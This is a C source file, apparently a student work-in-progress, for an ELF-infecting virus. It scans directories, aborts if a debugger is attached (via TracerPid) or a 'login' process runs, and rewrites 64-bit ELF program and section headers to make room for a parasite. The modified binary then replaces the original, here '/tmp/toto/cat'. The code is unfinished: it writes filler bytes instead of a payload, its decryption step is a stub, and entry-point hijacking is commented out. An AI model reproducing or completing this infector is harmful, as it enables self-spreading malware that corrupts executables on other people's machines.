//
// Created by Joris GOUNAND on 11/8/19.
//

#include <asm/unistd.h>
#include <asm/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
# include <stdbool.h>
#include <stdlib.h>

#include <dirent.h>
#include <elf.h>
#include <string.h>

# include <stdio.h> // DELL printfs

typedef struct	s_file
{
	int         fd;
	char		*data;
	size_t		size;
	bool        error;
}				t_file;
struct linux_dirent64 {
	long long        d_ino;    /* 64-bit inode number */
	unsigned long long        d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[]; /* Filename (null-terminated) */
};


static size_t  ft_strlen(const char *s);
static int get_env_var(char *name, char *content, int content_size);
static int open_directory(char *path);
static void    *ft_memmove(void *dst, const void *src, size_t len);
static bool process_runing(void); //CHANGER L APPELLE DE DIR
static int do_the_job(char file[],size_t size, char *path);
static int             ft_strncmp(const char *s1, const char *s2, size_t n);
static int infect(char path[],size_t path_length);
static void new_file(char buf[],size_t size, size_t end_of_text,char *path);
static  void	ft_putnbr(int nb);
static void		ft_putstr(char *s);
static int		ft_putchar(int c);
static int     ft_isdigit(int c);
static int ft_isallnum(char *str);

static char            *ft_strnstr(char *s1, char *s2, size_t n);
static int             ft_strcmp(const char *s1, const char *s2);

#define PAGE_SIZE 4096

# define __syscall0(type,name)          \
type name(void)                         \
{                                       \
	long __res;                         \
	__asm__ volatile(   "int $0x80"     \
						: "=a" (__res)  \
						: "0"(__NR_##name));\
	return ((type)__res);\
}

# define __syscall1(type,name,type1,arg1)   \
type name(type1 arg1)                       \
{                                           \
	long __res;                             \
	__asm__ volatile(   "int $0x80"     \
						: "=a" (__res)  \
						: "0"(__NR_##name), "b"((long)(arg1)));\
	return ((type)__res);\
}

# define __syscall2(type,name,type1,arg1,type2,arg2)\
type name(type1 arg1,type2 arg2)\
{\
	long __res;                        \
	__asm__ volatile(   "int $0x80"     \
						: "=a" (__res)  \
						: "0"(__NR_##name), "b"((long)(arg1)),"c"((long)(arg2)));\
	return ((type)__res);\
}

# define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3)\
type name(type1 arg1,type2 arg2, type3 arg3)\
{\
	long __res;                        \
	__asm__ volatile(   "int $0x80"     \
						: "=a" (__res)  \
						: "0"(__NR_##name), "b"((long)(arg1)),"c"((long)(arg2)), "d"((long)(arg3)));\
	return ((type)__res);\
}

# define __syscall4(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4)\
type name(type1 arg1,type2 arg2, type3 arg3, type4 arg4)\
{\
	long __res;                        \
	__asm__ volatile(   "int $0x80"     \
						: "=a" (__res)  \
						: "0"(__NR_##name), "b"((long)(arg1)),"c"((long)(arg2)), "d"((long)(arg3)),\
						"e"((long)(arg4)));\
	return ((type)__res);\
}


asm(
"__syscall6:\n"
"	pushl %ebp\n"
"	pushl %edi\n"
"	pushl %esi\n"
"	pushl %ebx\n"
"	movl  (0+5)*4(%esp),%eax\n"
"	movl  (1+5)*4(%esp),%ebx\n"
"	movl  (2+5)*4(%esp),%ecx\n"
"	movl  (3+5)*4(%esp),%edx\n"
"	movl  (4+5)*4(%esp),%esi\n"
"	movl  (5+5)*4(%esp),%edi\n"
"	movl  (6+5)*4(%esp),%ebp\n"
"	int $0x80\n"
"	popl %ebx\n"
"	popl %esi\n"
"	popl %edi\n"
"	popl %ebp\n"
"	ret"
);
extern long __syscall6(long n, long a, long b, long c, long d, long e, long f);

long syscall6(long call, long a, long b, long c, long d, long e, long f)
{
	long res = __syscall6(call,a,b,c,d,e,f);
	return res;
}



__syscall0(pid_t, getpid);
__syscall0(pid_t, fork);
__syscall1(int, close, int, fd);
__syscall1(void, exit, int, status);
__syscall1(int, unlink, const char *, pathname);

__syscall2(int, munmap, void *, addr, size_t, length);
__syscall2(int, fstat, int, fildes, struct stat * , buf);
__syscall2(int, rename, const char *, old, const char *, new);
__syscall2(int, kill, pid_t, pid, int, sig);

__syscall3(size_t, read, int, fd, void *, buf, size_t, count);
__syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
__syscall3(int, getdents64, int, fd, void *, dirp,  uint, count);
__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
__syscall3(int, mprotect, void *, addr, size_t, len, int, prot);

unsigned long get_eip(void);
extern int yeah;


_start()
{
	__asm__(".globl real_start\n"
	        "real_start:\n"
	        "call do_main\n"
		 "ret\n"

	        "jmp myend\n");

}

int do_main(void)
{
	//printf("%p\n",get_eip() - ((char *)&yeah - (char *)&do_main));
	pid_t pid;
	void *start;
	size_t size;
	char path_env[256] = {'/','t','m','p','/','t','e','s','t',':','/','t','m','p','/','t','e','s','t','2',':',0};
	if (process_runing())
		return (1);
	start = 0; //value get from the header
	size = 0; //value get from addr
	pid = fork();
	if (pid == 0) //children
	{
		if (mprotect(start, size, PROT_WRITE | PROT_READ) == -1) {
			write(2,"error mpr\n",10);
			if (0)
			return -1;
		}
		//decrypt
		if (mprotect(start, size, PROT_READ | PROT_EXEC) == -1) {
			write(2,"error mpr\n",10);
			if (0)
			return -1;
		}
		//printf("virus\n");
		//printf("content: %s\n",path_env);
		get_env_var("PATH=",path_env + 21,256 - 21);
		//printf("content %s\n",path_env);
		size_t path_length = ft_strlen(path_env);
		size_t i = 0;

		int length_path =0;
		do
		{
			if(path_env[i] == ':')
			{
				path_env[i] = '\0';
				//open_directory(&path[i] - length_path);
				open_directory(&path_env[i] - length_path);
				//write(1,&path[i] - length_path, length_path);
				//write(1,"\n",1);
				path_env[i] = ':';
				length_path = -1;
			}
			else if (path_env[i] == '\0')
			{
				if (length_path)
					open_directory(&path_env[i] - length_path);
				break ;
			}
			i++;
			length_path++;
		}
		while(i < path_length);

			infect(path_env, 256);
			write(1,"content: ",9);
			write(1,path_env,ft_strlen(path_env));
		exit (0);
	}
	//jump to original
	return (0);
}



static int get_env_var(char *name, char *content, int content_size)
{
	char buf[4];
	int fd;
	size_t n,i;
	int j,k = 0;
	int nb_start = 1;
	int name_lenght = ft_strlen(name);

	if ((fd = open("/proc/self/environ",0x0000,0))<0)
		return (0);
	do
	{
		n = read(fd,buf,4);
		for (i= 0; i < n ; ++i)
		{
			if (nb_start)
			{
				if (k != name_lenght)
				{
					if (buf[i] == name[k])
						k++;
					else
					{
						k = 0;
						nb_start = 0;
						j = 0;
					}
				}
				else if (j < content_size - 1)
				{
					if (buf[i] == '\0')
						goto  out;
					content[j++] = buf[i];
				}
				else
					goto out;
			}
			else if (buf[i] == '\0')
				nb_start = 1;
		}
	}
	while(n);
	out:
	content[j] = '\0';
	close(fd);
	return (content[0] != '\0');
}
static int open_directory(char *path)
{
	int dd,nread;
	char buf[128];
	char path_file[256];
	t_file file;
	int i = 0;
	struct linux_dirent64 *d;
	size_t len;

	write(1,"directory: ",11);
	write(1,path,ft_strlen(path));
	write(1,"\n",1);
	//printf("directory: '%s'\n",path);

	path = "/tmp/toto";
	dd = open (path, 0x10000,0);
	if (dd < 0)
	{
		ft_putstr("open fail ");
		ft_putstr(path);
		ft_putchar('\n');
		//printf("open fail: '%s'\n",path);

		return 1;

	}
	ft_putstr("getdents64\n");
	//printf("getdents64\n");
	nread = getdents64(dd, buf, 128);
	write(1,"nread :",7);
	ft_putnbr(nread);
	write(1,"\n",1);
	//printf("nread %d\n",nread);
	int c;
	while (i < nread)
	{
		d = (struct linux_dirent64 *) (buf + i);
		i += d->d_reclen ;
		ft_putstr("host ");
		ft_putstr(d->d_name);
		ft_putstr(" type ");
		ft_putnbr(d->d_type);
		ft_putchar('\n');
		//printf("host %s type %d\n",d->d_name, d->d_type);
		if (d->d_name[0] == '.')
			continue;
		len = ft_strlen(path);
		ft_memmove(path_file,path,len);
		path_file[len] = '/';
		ft_memmove(path_file + len + 1,d->d_name, ft_strlen(d->d_name));
		path_file[len + 1 + ft_strlen(d->d_name)] = '\0';
		ft_putstr(d->d_name);
		ft_putchar(' ');
		ft_putstr(path_file);
		ft_putchar('\n');
		//printf("%s %s\n",d->d_name,path_file);
		struct stat st;
		int fd = open (path_file, 0,0);
		fstat(fd , &st);
		char mem[st.st_size];
		int c = read(fd, mem,st.st_size);
		//write(1,mem,st.st_size);
		do_the_job(mem,st.st_size,path_file );
			exit(4);
	}
	close(dd);
	return 0;
}



static size_t  ft_strlen(const char *s)
{
	size_t  i;

	i = 0;
	while (*(s + i) != '\0')
	{
		i++;
	}
	return (i);
}
static void    *ft_memcpy(void *dst, const void *src, size_t n)
{
	unsigned char   *srctmp;
	unsigned char   *dsttmp;
	size_t                  i;

	srctmp = (unsigned char *)src;
	dsttmp = (unsigned char *)dst;
	i = 0;
	while (i < n)
	{
		dsttmp[i] = srctmp[i];
		i++;
	}
	return ((void *)dst);
}
static void    *ft_memmove(void *dst, const void *src, size_t len)
{
	char    *srctmp;
	char    *dsttmp;

	srctmp = (char *)src;
	dsttmp = (char *)dst;
	if (srctmp < dsttmp)
	{
		srctmp = (srctmp + len) - 1;
		dsttmp = (dsttmp + len) - 1;
		while (len-- > 0)
			*dsttmp-- = *srctmp--;
	}
	else
		ft_memcpy(dst, src, len);
	return ((void *)dst);
}
static int             ft_strncmp(const char *s1, const char *s2, size_t n)
{
	size_t  index;

	index = 0;
	while (index < n && s1[index] && s2[index] &&
	       (unsigned char)s1[index] == (unsigned char)s2[index])
	{
		index++;
	}
	if (index >= n)
		return (0);
	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
}

static bool process_runing(void)
{

	int fd,i,dd, nread;
	char buf[256]; // = sizeof(struct dirent)
	char *TracerPid;
	char *Name;
	struct linux_dirent64 *d;
	char path[64];

	ft_putnbr(sizeof(struct linux_dirent64));
	fd = open ("/proc/self/status", 0,0);
	ft_putstr("open /proc/self/status\n");
	while((i =read(fd,buf,256)) > 0)
	{
		if ((TracerPid = ft_strnstr(buf,"TracerPid:",i)) != 0)
		{
			TracerPid += 10;
			while(*TracerPid == '\t' || *TracerPid == ' ')
						TracerPid++;
			if (*TracerPid != '0' && *TracerPid != '\n')
				exit(1);
		}


	}
	close(fd);
	dd = open("/proc/",0x10000,0);
	if (dd <= 0)
	{
		ft_putstr("error opem /proc/\n");
		return 1;
	}
	ft_putstr("getdents64");
	ft_memmove(path,"/proc/",6);
	char cmdname[64];
	while ((nread = getdents64(dd, buf, 256)) > 0)
	{
		i = 0;
		while(i<nread)
		{
			d = (struct linux_dirent64 *) (buf + i);
			i += d->d_reclen ;
			if (ft_isallnum(d->d_name) == 0)
			{
				ft_putstr("good :");
				ft_memmove(path + 6,d->d_name,ft_strlen(d->d_name)+ 1);
				ft_memmove(path + ft_strlen(path), "/status\0", 8);
				fd = open(path,0,0);
				ft_putnbr(fd);
				ft_putchar('\n');

				ft_putstr(path);
				ft_putchar('\n');

				read(fd,cmdname, 64);
				if ((Name = ft_strnstr(cmdname,"Name:",i)) != 0)
				{
					Name += 5;
					while(*Name == '\t' || *Name == ' ')
						Name++;
					*ft_strnstr(Name, "\n",50) = '\0';
					if (!ft_strcmp(Name, "login"))
						exit(1);
					ft_putstr(Name);
					ft_putchar('\n');


				}

			}
		}
	}
	return (0);
}
static int do_the_job(char buff[],size_t size, char *path)
{
	ft_putstr("debut do_the_job\n");
	//printf("debut do_the_job\n");
	Elf64_Ehdr          *header;
	Elf64_Phdr*             seg;
	Elf64_Shdr*             sec;
	size_t      parasite_size = 690;
	Elf64_Addr text;
	Elf64_Addr parasite_vaddr;
	Elf64_Addr old_e_entry;
	Elf64_Addr end_of_text;
	int text_found = 0;
	int i;
	ft_putstr("1\n");
	ft_putnbr(size);
	write(1, buff, 20);
	ft_putstr("\n");
	if (size < sizeof(Elf64_Ehdr) || ft_strncmp(buff, ELFMAG,SELFMAG) || buff[EI_CLASS] != ELFCLASS64)
	{
		ft_putstr("return 1\n");
		return (1);
	}
	ft_putstr("1.1\n");

	header = (Elf64_Ehdr *)buff;
	seg = (Elf64_Phdr*)(buff + header->e_phoff);

	for (i = header->e_phnum; i-- > 0; seg++)
	{
		if (seg->p_type == PT_LOAD)
		{
			if (seg->p_flags == (PF_R | PF_X))
			{
				unsigned int pt = (PAGE_SIZE - 4) - parasite_size; // remplacer le 4 par la size de la signature

				//la c est le check de la signature
				// seg->p_offset + seg->p_filesz + pt

				if ("equal" && 0)
					return 1;
			}
		}
	}
	ft_putstr("2\n");

	//Recupere le premier segement TEXT on lui rajoute 4096
	//puis on rajoute a tous les segment suivant 4096
	seg = (Elf64_Phdr*)(buff + header->e_phoff);
	for (i = header->e_phnum; i-- > 0; seg++)
	{
		if (text_found)
		{
			//printf("seg-.p_vaddr %llx p_offset before %llx",seg->p_vaddr, seg->p_offset);
			seg->p_offset += PAGE_SIZE;
			//printf(" after %llx\n",seg->p_offset);
			continue;
		}
		else
		if (seg->p_type == PT_LOAD)
		{
			if (seg->p_flags == (PF_R | PF_X))
			{
				text = seg->p_vaddr;
				parasite_vaddr = seg->p_vaddr + seg->p_filesz;

				old_e_entry = header->e_entry;
				//header->e_entry = parasite_vaddr;
				end_of_text = seg->p_offset + seg->p_filesz;

				seg->p_filesz += parasite_size;
				seg->p_memsz += parasite_size;

				text_found++;
			}
		}
	}
	ft_putstr("3\n");

	sec = (Elf64_Shdr*)(buff + header->e_shoff);

	for (i = header->e_shnum; i-- > 0; sec++)
	{
		//printf("section %llx\n",sec->sh_offset);
		if (sec->sh_offset >= end_of_text)
			sec->sh_offset += PAGE_SIZE;
		else
		if (sec->sh_size + sec->sh_addr == parasite_vaddr)
			sec->sh_size += parasite_size;
	}
	header->e_shoff += PAGE_SIZE;
	new_file(buff,size,end_of_text, path);
	ft_putstr("fim do_the_job\n");
	return 0;
}
static int infect(char path[],size_t path_length)
{
	size_t i = 0;

	int length_path =0;
	do
	{
		if(path[i] == ':')
		{
			path[i] = '\0';
			//open_directory(&path[i] - length_path);
			open_directory(&path[i] - length_path);
			//write(1,&path[i] - length_path, length_path);
			//write(1,"\n",1);
			path[i] = ':';
			length_path = -1;
		}
		else if (path[i] == '\0')
		{
			if (length_path)
				open_directory(&path[i] - length_path);
			break ;
		}
		i++;
		length_path++;
	}
	while(i < path_length);
	return 0;
}
static char    *only_name(char *line)
{
	int        size;
	size = ft_strlen(line);
	size++;
	while (--size)
	{
		if (line[size] == '/')
			return (&(line[size + 1]));
	}
	return (line);
}
static void new_file(char buf[],size_t size, size_t end_of_text,char *path)
{
	int fd;
	char *data;
	char tmp[125];
	ft_putstr("new_file debut ");

	for (int i = 0; i< 125;i++)
		tmp[i] = 0;
	ft_memmove(tmp,path,ft_strlen(path));
	ft_memmove(only_name(tmp) + 1,only_name(tmp), ft_strlen(only_name(tmp)));
	*only_name(tmp) = '.';
	ft_putstr(tmp);
	ft_putchar('\n');
	if ((fd = open (tmp, 0x242, 0755)) < 0)
	{
		ft_putstr("error open fd %d\n");
		return ;
	}
	ft_putstr("new_file 1\n");
	char new_data[size + PAGE_SIZE];

	ft_putstr("new_file 2\n");

	///write(fd,buff,file->size + PAGE_SIZE);

	write(fd,buf, end_of_text);

	for (int i = 0; i< PAGE_SIZE;i++)
		write(fd,"j",1);
	write(fd,buf + end_of_text, size - end_of_text);
	//ft_memmove(data,file->data, end_of_text);
	//ft_memmove(data + PAGE_SIZE + end_of_text,file->data + end_of_text, file->size - end_of_text);
	write(1,data, 15);
	ft_putstr("tmp ");
	ft_putstr(tmp);
	ft_putstr(", path ");
	ft_putstr(path);
	ft_putchar('\n');
	//printf("tmp %s, path %s\n",tmp, path);
	close(fd);

	char argv[] = "mv /tmp/toto/.cat /tmp/toto/cat";
	//system(argv);
	unlink("/tmp/toto/cat");
	int ret = rename (tmp, "/tmp/toto/cat");
	ft_putstr("fin rename ");
	ft_putnbr(ret);
	ft_putchar('\n');

}
unsigned long get_eip(void)
{
	__asm__("call yeah\n"
	        ".globl yeah\n"
	        "yeah:\n"
	        "pop %eax");
}
static int	ft_putchar(int c)
{
	return (write(1, &c, 1));
}
static void		ft_putstr(char *s)
{
	if (!s)
		return ;
	write(1, s, ft_strlen(s));
}
static  void	ft_putnbr(int nb)
{
	if (nb == -2147483648)
		ft_putstr("-2147483648");
	else
	{
		if (nb < 0)
		{
			ft_putchar('-');
			nb = -nb;
		}
		if (nb > 9)
		{
			ft_putnbr(nb / 10);
			ft_putnbr(nb % 10);
		}
		else
			ft_putchar((char)nb + 48);
	}
}

static int     ft_isdigit(int c)
{
	if ((c >= '0') && (c <= '9'))
		return (1);
	return (0);
}
static int ft_isallnum(char *str)
{
	while(*str)
	{
		if (!ft_isdigit(*str))
			return 1;
		str++;
	}
	return 0;
}
static char            *ft_strnstr(char *s1, char *s2, size_t n)
{
	size_t  i;

	if (!(*s2))
		return ((char *)s1);
	while (*s1 && n--)
	{
		if (*s1 == s2[0])
		{
			i = 1;
			while (n-- && s1[i] && s2[i] && s1[i] == s2[i])
				++i;
			if (i == ft_strlen(s2))
				return ((char *)s1);
			n += i;
		}
		s1++;
	}
	return (NULL);
}

static int             ft_strcmp(const char *s1, const char *s2)
{
	int     index;

	index = 0;
	while (s1[index] && s2[index] &&
	       (unsigned char)s1[index] == (unsigned char)s2[index])
	{
		index++;
	}
	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
}

void end_code() {
__asm__(".globl myend\n"
        "myend:	     \n"
        "mov $1,%eax \n"
        "mov $0,%ebx \n"
        "int $0x80   \n");

}
